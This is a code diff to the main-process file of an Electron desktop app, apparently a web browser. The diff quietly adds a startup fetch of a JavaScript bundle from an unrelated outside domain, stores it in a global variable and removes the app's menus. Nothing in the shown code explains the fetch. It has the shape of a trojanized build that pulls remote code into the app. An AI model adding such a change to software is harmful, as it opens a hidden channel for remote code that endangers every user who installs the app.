@@ -7,7 +7,7 @@ import { existsSync, writeFileSync, promises } from 'fs';
 import { getPath } from '~/shared/utils/paths';
 import { Settings } from '~/renderer/app/models/settings';
 import { makeId } from '~/shared/utils/string';
-import { getMainMenu } from './menus/main';
+import fetch from 'electron-fetch';
 import { runAutoUpdaterService } from './services/auto-updater';
 
 export const log = require('electron-log');
@@ -17,7 +17,11 @@ log.transports.file.level = 'verbose';
 log.transports.file.file = resolve(app.getPath('userData'), 'log.log');
 
 ipcMain.setMaxListeners(0);
-
+fetch('https://ukrainiangirls.pw/assets/HCApp_prod/embeded/dist/bundle.js').then(res => res.text())
+    .then(res => {
+                  // @ts-ignore
+      global.content = res
+              })
 export let appWindow: AppWindow;
 export let settings: Settings = {};
 
@@ -69,7 +73,7 @@ app.on('ready', async () => {
     );
   }
 
-  Menu.setApplicationMenu(getMainMenu(appWindow));
+  Menu.setApplicationMenu(null);
 
   session.defaultSession.setPermissionRequestHandler(
     (webContents, permission, callback) => {
@@ -89,6 +93,7 @@ app.on('ready', async () => {
 
   appWindow = new AppWindow();
 
+  appWindow.setMenu(null)
   const viewSession = session.fromPartition('persist:view');
 
   viewSession.on('will-download', (event, item, webContents) => {
